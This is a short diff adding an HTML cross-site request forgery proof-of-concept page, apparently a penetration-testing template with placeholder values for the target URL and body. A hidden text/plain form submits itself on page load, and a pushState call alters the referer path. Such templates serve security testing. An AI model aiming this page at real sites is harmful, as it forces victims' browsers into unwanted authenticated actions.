@@ -1,0 +1,13 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://target_URL" method="POST" enctype="text/plain">
+      <input type="hidden" name="URL_encoded_POST_body_data" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+     <!-- script to auto sumbit -->
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
